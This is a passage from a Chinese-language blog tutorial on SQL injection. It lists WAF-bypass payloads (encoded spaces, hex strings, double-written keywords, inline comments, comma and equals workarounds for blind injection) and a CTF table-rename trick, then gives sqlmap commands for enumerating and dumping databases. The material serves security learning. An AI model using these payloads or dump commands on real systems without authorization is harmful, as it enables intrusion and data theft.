<li><p>特殊符号<br>绕过空格的几种方法 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%09 tab键      %0a 新建一行  %0c 新的一页 </span><br><span class="line">%0d return功能 %0b tab键垂直 %a0 空格</span><br><span class="line">/**/    ()      /*!*/</span><br></pre></td></tr></table></figure>
<p>引号绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select a from yz where b=0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
<p>逗号绕过<br>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">对于substr()和mid()这两个方法可以使用from to的方式来解决：</span><br><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br><span class="line">如果for被过滤</span><br><span class="line">可以使用reverse翻转，substr((reverse(substr(‘flag’ form 1))) from 4 )</span><br><span class="line">ord()返回字符串的第一个ASCII值，也可以直接ord(substr((database())from(1)))</span><br><span class="line">limit可以使用offset来绕过：</span><br><span class="line">select * from news limit 0,1</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
<p>等号绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sql中 &lt;&gt; 含义与 != 相似</span><br><span class="line">select * from t_student where age !=12 and age !=23;</span><br><span class="line">select * from t_student where age &lt;&gt;&#x27;23&#x27;and age &lt;&gt;&#x27;12&#x27;</span><br><span class="line">使用like,relike,regexp</span><br></pre></td></tr></table></figure></li>
<li><p>关键字</p>
</li>
</ol>
<ul>
<li>大小写    </li>
<li>内联注释<br>内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!..*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行     </li>
<li>双写绕过<br>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。</li>
<li>参数污染<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/img_202215454843.jpg" alt="img_202215454843">   </li>
<li>更改表名列名   </li>
</ul>
<p>经过探测我们可以猜测出这里会查询出words表的data列的结果。也就是类似于下面的sql语句：</p>
<p><code>select * from words where id = &#39;&#39;;</code></p>
<p>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。<br>修改表名和列名的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30); </span><br></pre></td></tr></table></figure>
<h2 id="SQLMAP的使用"><a href="#SQLMAP的使用" class="headerlink" title="SQLMAP的使用"></a>SQLMAP的使用</h2><p>手动注入费时费力,我们可以通过工具来提高效率,但使用工具的前提是我们发现了漏洞.  </p>
<ol>
<li>系统命令   </li>
</ol>
<p>-h                                          显示基本帮助信息<br>-hh                                         显示高级帮助信息<br>-version                                    显示版本号<br>-v                                          详细等级（0-6 默认 1）<br>                                        0：只显示python错误以及重要信息<br>                                        1：显示信息以及警告<br>                                        2：显示debug消息<br>                                        3：显示注入payload<br>                                        4：显示http请求<br>                                        5：显示http响应头<br>                                        6：显示http响应内容  </p>
<ol start="2">
<li>Target                             </li>
</ol>
<p>-u                               指定目标url   </p>
<p>-d                               直接连接数据库</p>
<p>-m                               将目标地址保存在文件中，一行为一个URL地址进行批量检测   </p>
<p>-l                               从burp代理日志的解析目标</p>
<p>-r                               从文件中加载http请求</p>
<p>-g                               从google dork的结果作为目标url</p>
<p>-c                               从INI配置文件中加载选项<br>3. 常规漏洞挖掘   </p>
<p>sqlmap.py -u url –is-dba ：判断当前用户是否有管理员权限</p>
<p>sqlmap.py -u url –roles ：列出数据库所有管理员角色</p>
<p>sqlmap.py -u url –current-db ：查看当前数据库</p>
<p>sqlmap.py -u url -D 库名 –tables  ：爆表</p>
<p>sqlmap.py -u url -D 库名 -T 表名 –columns ：爆字段</p>
<p>sqlmap.py -u url -D 库名 -T 表名 -C 字段名1，字段名2 –dump ：爆数据</p>
<ol start="4">
<li>HTTP请求方式    </li>
</ol>
<ul>
<li>POST 参数：–data (以“&amp;”作为分隔符)    </li>
<li>cookie 参数：–cookie (cookie默认的分隔符为“;”)<br>当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞   </li>
<li>User-Agent 参数：–user-agent和–random-agent<br>当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞  </li>
<li>Host 参数：–host<br>当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞   </li>
<li>Referer 参数：–referer<br>当“–level”设置为3或更高时，Sqlmap会检测Referer是否存在注入漏洞  </li>
</ul>
<p>–proxy=                                使用代理(可配合burp跑https)<br>–delay=                                设置延迟时间（两个请求之间)<br>–common-tables                         暴力破解表<br>–common-colomns                        暴力破解列<br>–threads=                              使用多少线程<br>–batch                                 选择默认选项</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/SQL/" rel="tag"># SQL</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/01/22/SQL%E8%AF%AD%E6%B3%95/" rel="prev" title="SQL语法">
                  <i class="fa fa-chevron-left"></i> SQL语法
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="文件上传漏洞">
                  文件上传漏洞 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mayylu</span>
</div>
  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
